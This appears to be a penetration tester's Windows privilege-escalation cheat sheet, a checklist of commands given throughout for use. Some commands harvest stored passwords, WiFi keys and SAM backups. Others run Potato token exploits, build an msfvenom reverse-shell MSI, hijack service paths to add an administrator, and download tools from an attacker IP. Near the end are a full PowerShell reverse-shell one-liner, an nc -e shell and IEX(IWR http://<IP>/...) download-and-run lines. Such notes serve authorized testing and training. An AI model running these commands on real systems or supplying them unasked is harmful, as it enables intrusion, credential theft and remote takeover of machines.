# checklist-to-escalate

**Author:** Julien Bongars\
**Date:** 2025-10-16 00:07:04
**Path:**

---

**Best tool:** [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

---

## System Info

- [ ] `systeminfo` - Check OS version, architecture, patches
- [ ] `wmic qfe list` - Installed hotfixes
- [ ] Search kernel exploits: searchsploit, Google
- [ ] `set` - Environment variables (passwords?)
- [ ] `type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` - PowerShell history
- [ ] `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` - AutoLogon credentials
- [ ] `wmic logicaldisk get caption,description,providername` - Mounted drives
- [ ] Check WSUS configuration for hijacking
- [ ] `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` (both HKCU and HKLM = 0x1)

---

## User & Privileges

- [ ] `whoami /all` - Current user, groups, privileges
- [ ] `whoami /priv` - Token privileges
- [ ] **Check for:** `SeImpersonatePrivilege`, `SeAssignPrimaryPrivilege` → Potato attacks
- [ ] **Check for:** `SeBackupPrivilege`, `SeRestorePrivilege` → Backup/restore files
- [ ] **Check for:** `SeDebugPrivilege` → Debug processes
- [ ] **Check for:** `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`
- [ ] `net user` - All local users
- [ ] `net localgroup administrators` - Admin group members
- [ ] `net accounts` - Password policy
- [ ] `query user` / `qwinsta` - Logged in users

---

## Services

- [ ] `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """"` - Unquoted service paths
- [ ] `icacls "C:\Program Files\Service\binary.exe"` - Service binary permissions
- [ ] `sc qc <service>` - Service configuration
- [ ] `accesschk.exe -uwcqv "Everyone" *` - Weak service permissions
- [ ] `accesschk.exe -uwcqv "Authenticated Users" *`
- [ ] Can you modify service config? `sc config <service> binPath= "cmd.exe"`
- [ ] Check services registry: `reg query HKLM\SYSTEM\CurrentControlSet\Services`

---

## Scheduled Tasks

- [ ] `schtasks /query /fo LIST /v` - All scheduled tasks
- [ ] Check task binary permissions: `icacls C:\path\to\task.exe`
- [ ] Look for tasks running as SYSTEM with writable binaries
- [ ] Check task XML files: `icacls C:\Windows\System32\Tasks\*`

---

## Applications & Startup

- [ ] `wmic product get name,version` - Installed software
- [ ] Check for vulnerable applications
- [ ] `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` - Startup programs (HKLM & HKCU)
- [ ] `icacls "C:\Program Files"` - Can you write to Program Files?
- [ ] `icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"` - Startup folder writable?

---

## DLL Hijacking

- [ ] `echo %PATH%` - Check writable directories in PATH
- [ ] Use Process Monitor to find missing DLLs
- [ ] Check if service binary loads DLLs from writable locations
- [ ] `icacls C:\path\to\service\folder` - Can you write DLLs?

---

## Processes

- [ ] `tasklist /v` - Running processes
- [ ] `wmic process list full` - Full process details
- [ ] Check process binaries: `icacls C:\path\to\process.exe`
- [ ] Look for processes running as SYSTEM with weak permissions
- [ ] Check for credentials in memory (ProcDump, Mimikatz)

---

## Network

- [ ] `ipconfig /all` - Network configuration
- [ ] `netstat -ano` - Active connections
- [ ] `route print` - Routing table
- [ ] `arp -a` - ARP cache
- [ ] `netsh firewall show state` - Firewall status
- [ ] Look for services listening on 127.0.0.1 only

---

## Credentials & Passwords

### Registry

- [ ] `reg query HKLM /f password /t REG_SZ /s` - Search registry for passwords
- [ ] `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"` - AutoLogon
- [ ] `reg query "HKCU\Software\ORL\WinVNC3\Password"` - VNC passwords
- [ ] `reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP"` - SNMP parameters
- [ ] `reg query HKCU\Software\SimonTatham\PuTTY\Sessions` - PuTTY sessions

### Files

- [ ] `findstr /si password *.xml *.ini *.txt *.config 2>nul` - Search files
- [ ] `dir /s /b C:\*password* 2>nul`
- [ ] `dir /s /b C:\*.config 2>nul`
- [ ] `type C:\inetpub\wwwroot\web.config` - IIS web.config
- [ ] `type C:\Windows\Panther\Unattend.xml` - Unattended install files
- [ ] `dir /s /b C:\*unattend.xml`
- [ ] Search user directories: Desktop, Documents, Downloads

### Saved Credentials

- [ ] `cmdkey /list` - Saved credentials
- [ ] `vaultcmd /listcreds:"Windows Credentials"` - Windows Vault
- [ ] `runas /savecred /user:Administrator cmd.exe` - Use saved creds

### Application Configs

- [ ] PHP: `type C:\xampp\htdocs\config.php`, `type C:\inetpub\wwwroot\web.config`
- [ ] Database configs: `findstr /si connectionString *.config`
- [ ] Look for: `.env`, `config.php`, `web.config`, `appsettings.json`

### Backups

- [ ] `dir /s /b C:\*.bak 2>nul`
- [ ] `dir /s /b C:\*.backup 2>nul`
- [ ] `dir /s /b C:\*.old 2>nul`
- [ ] `dir /s /b C:\*.sql 2>nul`
- [ ] Check: `C:\Backup`, `C:\Users\*\Desktop\backup`

### Other

- [ ] `type %USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- [ ] `netsh wlan show profile` → `netsh wlan show profile <SSID> key=clear` - WiFi passwords
- [ ] Browser data: cookies, saved passwords, history
- [ ] `dir /s /b C:\Users\*.ppk 2>nul` - SSH keys
- [ ] SAM/SYSTEM backups: `%SYSTEMROOT%\repair\SAM`, `%SYSTEMROOT%\System32\config\RegBack\SAM`

---

## Token Impersonation Exploits

**If SeImpersonatePrivilege or SeAssignPrimaryPrivilege enabled:**

- [ ] **JuicyPotato** (Windows 2008-2016): `JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *`
- [ ] **PrintSpoofer** (Windows 10/Server 2016-2019): `PrintSpoofer.exe -i -c cmd`
- [ ] **RoguePotato** (Windows 10/2019): `RoguePotato.exe -r <AttackerIP> -e "cmd.exe" -l 9999`
- [ ] **GodPotato** (Windows 2012-2022): `GodPotato.exe -cmd "cmd /c whoami"`

---

## AlwaysInstallElevated

- [ ] Check both registry keys for `0x1`:
  - `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
  - `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
- [ ] Create MSI: `msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f msi > exploit.msi`
- [ ] Install: `msiexec /quiet /qn /i exploit.msi`

---

## Quick Wins

### Unquoted Service Paths

```batch
# Find them
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# If path is: C:\Program Files\My Service\service.exe
# Create: C:\Program.exe or C:\Program Files\My.exe
# Restart service
sc stop <service> && sc start <service>
```

### Weak Service Permissions

```batch
# Check permissions
accesschk.exe -uwcqv "Everyone" *

# Modify service
sc config <service> binPath= "net localgroup administrators <user> /add"
sc stop <service> && sc start <service>
```

### Writable Service Binary

```batch
# Check if you can overwrite
icacls "C:\Program Files\Service\service.exe"

# Replace with malicious binary
copy malicious.exe "C:\Program Files\Service\service.exe"

# Restart
sc stop <service> && sc start <service>
```

---

## File Transfer

```powershell
# PowerShell
IWR -Uri http://<IP>/file.exe -OutFile file.exe
(New-Object Net.WebClient).DownloadFile('http://<IP>/file.exe', 'file.exe')

# Certutil
certutil -urlcache -f http://<IP>/file.exe file.exe

# SMB (from Kali: impacket-smbserver share . -smb2support)
copy \\<ATTACKER_IP>\share\file.exe .
```

---

## Reverse Shells

```powershell
# PowerShell one-liner
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Netcat
nc.exe -e cmd.exe <IP> 4444
```

---

## Automated Tools

- **WinPEAS**: `.\winPEASx64.exe`
- **PowerUp**: `IEX(IWR http://<IP>/PowerUp.ps1 -UseBasicParsing); Invoke-AllChecks`
- **PrivescCheck**: `IEX(IWR http://<IP>/PrivescCheck.ps1); Invoke-PrivescCheck`
- **Seatbelt**: `.\Seatbelt.exe -group=all`
- **Windows Exploit Suggester**: `python windows-exploit-suggester.py --database <date>.xls --systeminfo systeminfo.txt`

---

## Resources

- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
- **HackTricks**: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
- **LOLBAS**: https://lolbas-project.github.io/
- **GTFOBins (Windows)**: https://wadcoms.github.io/
